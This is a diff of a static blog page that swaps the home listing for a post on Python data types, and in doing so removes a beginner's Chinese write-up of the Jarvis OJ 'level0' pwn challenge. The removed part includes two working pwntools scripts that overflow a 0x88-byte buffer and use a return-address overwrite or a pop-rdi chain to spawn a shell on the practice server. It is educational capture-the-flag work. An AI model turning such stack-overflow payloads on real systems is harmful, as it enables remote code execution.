@@ -9,13 +9,17 @@
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="学习python基本数据类型 python在写代码时不用声明变量 在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？ 数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等， 其中包括他们的基本用法和其常用的方法，这里会一一列举出来 然后我们还需要了解一些运算符， 因为这些基本数据类型常常会用于一些运算等等二、基本数据类型 1、数字  —&amp;gt; int类">
+<meta property="og:type" content="article">
 <meta property="og:title" content="study">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/13/python/index.html">
 <meta property="og:site_name" content="study">
+<meta property="og:description" content="学习python基本数据类型 python在写代码时不用声明变量 在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？ 数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等， 其中包括他们的基本用法和其常用的方法，这里会一一列举出来 然后我们还需要了解一些运算符， 因为这些基本数据类型常常会用于一些运算等等二、基本数据类型 1、数字  —&amp;gt; int类">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-13T13:28:38.535Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="study">
+<meta name="twitter:description" content="学习python基本数据类型 python在写代码时不用声明变量 在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？ 数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等， 其中包括他们的基本用法和其常用的方法，这里会一一列举出来 然后我们还需要了解一些运算符， 因为这些基本数据类型常常会用于一些运算等等二、基本数据类型 1、数字  —&amp;gt; int类">
   
     <link rel="alternative" href="/atom.xml" title="study" type="application/atom+xml">
   
@@ -161,9 +165,7 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-python" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-python" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2019/08/13/python/" class="article-date">
@@ -283,138 +285,42 @@ for key in info:
       
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
   </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/08/level0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">level0</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
   
 </article>
 
 
-
-
-
-
-
-  
-    <article id="post-level0" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/08/08/level0/" class="article-date">
-  	<time datetime="2019-08-08T07:25:16.000Z" itemprop="datePublished">2019-08-08</time>
-</a>
+<div class="ds-share share" data-thread-key="python" data-title="" data-url="http://yoursite.com/2019/08/13/python/"  data-images="1.jpg" data-content="">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
     </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/level0/">
-        level0
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a>
-
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img src="level0_/checksec.png" alt></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img src="level0_/z.png" alt></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img src="level0_/rop.png" alt></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/level0做题收获/">level0做题收获</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
+ </div>
+ 
 
 
 
 
 
-
-
-  
-  
 </div>
       <footer id="footer">
   <div class="outer">
@@ -438,8 +344,8 @@ p.interactive()</code></pre><p>`</p>
 		fancybox: true,
 		mathjax: true,
 		animate: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
